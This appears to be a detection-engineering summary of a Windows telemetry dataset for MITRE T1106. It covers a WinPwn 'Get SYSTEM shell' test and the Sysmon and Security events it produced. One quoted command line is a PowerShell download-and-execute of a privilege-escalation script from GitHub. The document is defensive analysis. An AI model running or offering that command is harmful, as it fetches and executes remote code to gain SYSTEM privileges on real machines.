# T1106-3: Native API — WinPwn - Get SYSTEM shell - Bind System Shell using CreateProcess technique

## Technique Context

T1106 (Native API) covers adversary use of Windows Native API functions to execute behaviors that would normally be performed by higher-level APIs or command-line utilities. Attackers leverage native APIs to avoid detection mechanisms that focus on process creation, command-line monitoring, or API hooking at higher levels. This technique is particularly significant for privilege escalation, process injection, and evasion scenarios.

The specific test here involves WinPwn's "Get SYSTEM shell" functionality using CreateProcess techniques. This represents a common pattern where attackers use native API calls to spawn new processes with elevated privileges, often as part of privilege escalation or lateral movement operations. Detection engineers typically focus on unusual process creation patterns, privilege token manipulation, and direct API usage that bypasses normal Windows subsystems.

## What This Dataset Contains

This dataset captures a PowerShell-based attempt to download and execute a privilege escalation script. The key evidence includes:

**Security Event 4688** shows the critical command line: `"powershell.exe" & {iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Get-System-Techniques/master/CreateProcess/Get-CreateProcessSystemBind.ps1')}` executed by process ID 18616. The process exits with status 0x1, indicating failure.

**Sysmon Event 1** captures the same PowerShell process creation with full process ancestry showing the parent as another PowerShell process (PID 18512). The command attempts to download and execute a known privilege escalation script from S3cur3Th1sSh1t's repository.

**Sysmon Event 10** shows process access attempts where the PowerShell process (18512) accesses both a whoami.exe process (30580) and another PowerShell process (18616) with full access rights (0x1FFFFF), indicating potential process injection or manipulation attempts.

**Security Event 4703** documents privilege token adjustment where SeAssignPrimaryTokenPrivilege, SeIncreaseQuotaPrivilege, and other high-privilege rights are enabled, suggesting the test attempted to leverage existing SYSTEM privileges.

**Sysmon Event 3** shows Windows Defender making multiple HTTPS connections to 48.211.71.194:443, likely for telemetry or signature updates triggered by the malicious activity detection.

## What This Dataset Does Not Contain

The dataset lacks evidence of successful native API execution. The PowerShell process exits with code 0x1, indicating the download or execution failed. This appears to be either due to Windows Defender blocking the download, network restrictions, or script execution policies.

There are no Sysmon Event 8 (CreateRemoteThread) or Event 7 entries showing injection-related DLLs being loaded into target processes, suggesting the CreateProcess-based privilege escalation technique did not complete successfully.

The PowerShell channel contains only test framework boilerplate (Set-StrictMode, Set-ExecutionPolicy Bypass) and error handling scriptblocks, with no evidence of the actual malicious script content being logged or executed.

Network connection events from the PowerShell process itself are missing, confirming the download attempt was likely blocked before establishing a connection to the GitHub repository.

## Assessment

This dataset provides moderate value for detection engineering focused on T1106 technique attempts rather than successful executions. The Security 4688 events with command-line logging capture the complete attack vector, making this useful for building detections around malicious PowerShell download attempts and known privilege escalation repositories.

The Sysmon process access events (EID 10) demonstrate the behavioral patterns of tools attempting process manipulation even when the core technique fails. However, the lack of successful native API execution limits its utility for understanding the full technique implementation.

The privilege token adjustment events (Security 4703) provide good detection opportunities for monitoring unusual privilege combinations being enabled by processes, regardless of whether subsequent techniques succeed.

## Detection Opportunities Present in This Data

1. **Malicious PowerShell Download Detection**: Security EID 4688 command lines containing `downloadstring()` methods targeting known attacker repositories like S3cur3Th1sSh1t's GitHub.

2. **Privilege Escalation Script Repository Access**: Command lines attempting to download from paths containing "Get-System-Techniques", "CreateProcess", or other privilege escalation indicators.

3. **Process Access with Full Rights**: Sysmon EID 10 showing PowerShell processes accessing other processes with 0x1FFFFF (PROCESS_ALL_ACCESS) permissions, indicating potential injection attempts.

4. **High-Privilege Token Adjustment**: Security EID 4703 events where processes enable combinations of SeAssignPrimaryTokenPrivilege, SeIncreaseQuotaPrivilege, and SeSecurityPrivilege simultaneously.

5. **PowerShell Process Spawning Patterns**: Parent-child relationships where PowerShell spawns additional PowerShell processes with suspicious command lines involving `iex()` and web downloads.

6. **Failed Execution with Network Indicators**: Correlation between process exits with non-zero status codes and concurrent Windows Defender network activity to threat intelligence domains.
